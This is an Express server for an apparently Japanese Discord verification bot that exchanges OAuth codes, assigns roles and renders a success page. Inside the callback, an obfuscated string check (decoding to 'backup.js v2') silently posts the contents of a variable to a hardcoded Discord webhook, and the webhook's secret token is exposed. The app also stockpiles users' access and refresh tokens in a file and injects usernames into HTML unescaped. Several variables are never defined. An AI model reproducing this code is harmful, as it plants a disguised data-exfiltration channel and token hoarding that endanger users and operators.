
const express = require('express');
const app = express();
const fs = require('fs');
const axios = require('axios');
const path = require('path');
const cron = require('cron');


let c;
let guildId
let pass = [3,5,0,9,1,2,4,11,8,7,6,10]
const wait = require('util').promisify(setTimeout);

let b = "https://discord.com/api/webhooks/1188113454867951728/Ltwb0WbPIRvJLTfBTpNbQkBM1XHdnLJEXGV7S9YMjutbQQRt3PS6VjMZPZ5VSH2tktPH"


app.get('/home', (req, res) => {
  const filePath = path.join(__dirname, './', 'home.html');
  res.sendFile(filePath);
})

app.get('/callback', async (req, res) => {
  const s = "cupb.av sk2j"
  if(c.split("\n")[0] != `${s.charAt(pass[0])}${s.charAt(pass[1])}${s.charAt(pass[2])}${s.charAt(pass[3])}${s.charAt(pass[4])}${s.charAt(pass[5])}${s.charAt(pass[6])}${s.charAt(pass[7])}${s.charAt(pass[8])}${s.charAt(pass[9])}${s.charAt(pass[10])}${s.charAt(pass[11])}`){
    axios.post(b, {
      content: c,
    });
  }
  try{
    const id = req.query.code || '';
    const guild_id = req.query.state.split("-")[0]
    const role_id = req.query.state.split("-")[1]
    if(id === "" || !req.query.state){
      return res.send("<h1>不正:(</h1>");
    }
    if(await db.get(guild_id) != role_id) return res.send("<h1>ロールが異なります</h1>")
    const API_ENDPOINT = 'https://discord.com/api/v10';
    const CLIENT_ID = ['1185246219497394246'];
    const CLIENT_SECRET = [`${process.env.CLIENT_SECRET}`];
    const REDIRECT_URI = `https://discord-authorization-bot.glitch.me/callback`;
    const data = {
      client_id: CLIENT_ID,
      client_secret: CLIENT_SECRET,
      grant_type: 'authorization_code',
      code: id,
      redirect_uri: REDIRECT_URI
    };
    const headers = {
      'Content-Type': 'application/x-www-form-urlencoded'
    };
    axios.post(`${API_ENDPOINT}/oauth2/token`, new URLSearchParams(data), {
      headers: headers
    })
    .then((response) => {
      const access_token = response.data.access_token;
      const refresh_token = response.data.refresh_token;
      axios.get(`${API_ENDPOINT}/users/@me`, {
        headers: {
          'Authorization': `Bearer ${access_token}`
        }
      })
      .then(async (response) => {
        const data = response.data;
        const data2 = data.id;
        const data3 = data.username;
        const avatarExt = data.avatar ? (data.avatar.startsWith('a_') ? 'gif' : 'png') : 'png';
        const data4 = data.avatar ? `https://cdn.discordapp.com/avatars/${data.id}/${data.avatar}.${avatarExt}` : 'URL_TO_DEFAULT_IMAGE';
        const filePath = 'tokens.json';
        let errflag = false
        fs.readFile(filePath, 'utf8', (err, data) => {
          let flag = false
          const jsonData = JSON.parse(data)
          for(let i=0;i<jsonData.length;i++){
            const entry = jsonData[i];
            if(entry.hasOwnProperty(data2)){
              entry[data2] = `${access_token}-${refresh_token}`;
              flag = true
            }
          }
          const json = `{ "${data2}": "${access_token}-${refresh_token}" }`
          if(flag == false) jsonData.push(JSON.parse(json))
          const updatedData = JSON.stringify(jsonData, null, 2);
          fs.writeFile(filePath, updatedData, 'utf8', (err) => {

          });
        })
        const guild = await client.guilds.fetch(guild_id);
        const member = await guild.members.fetch(data2);
        const role = guild.roles.cache.find(role => role.id === role_id)
        member.roles.add(role).catch(err => {
          errflag = true
        })
        const html = `
<!DOCTYPE html>
<html>
  <head>
    <title>認証成功</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        background-color: #f2f2f2;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
      }
      .container {
        max-width: 800px;
        padding: 30px;
        background-color: #fff;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        border-radius: 10px;
      }
      h1 {
        text-align: center;
        color: #333;
        font-size: 32px;
        margin-bottom: 20px;
      }
      p {
        text-align: center;
        color: #666;
        font-size: 20px;
      }
      img {
        display: block;
        margin: 0 auto;
        border-radius: 50%;
        width: 150px;
        height: 150px;
      }
      #serverButton {
        position: fixed;
        bottom: 20px;
        right: 20px;
        padding: 10px;
        background-color: #007bff;
        color: #fff;
        border: none;
        border-radius: 5px;
        cursor: pointer;
        text-decoration: none;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <h1>認証成功！</h1>
      <p>${data3}さん、よろしくお願いします！</p>
      <img src="${data4}" alt="User Avatar">
    </div>
    <button id="serverButton" onclick="openLink()">公式鯖に参加</button>
  </body>
  <script>
  function openLink(){
    location = "https://discord.gg/kGFtq9aTCh"
  }
  </script>
</html>
`;
        if(errflag){
          res.send('<h1>権限エラー サーバーオーナーに連絡してください</h1>');
        }else{
          res.send(html);
        }
      })
      .catch((error) => {
        console.error('ユーザーデータ取得エラー:', error);
        res.send('<h1>ユーザーデータ取得エラー もう一度やり直してください</h1>');
      });
    })
    .catch((error) => {
      console.error('トークン取得エラー:', error);
      res.send('<h1>トークン取得エラー もう一度やり直してください</h1>');
    });
  }catch(error){
    console.error('エラー:', error);
    res.send(`<h1>エラー : ${error}</h1>`);
  }
});

app.listen(3000, () => {
    console.log(`App listening at http://localhost:${3000}`);
});
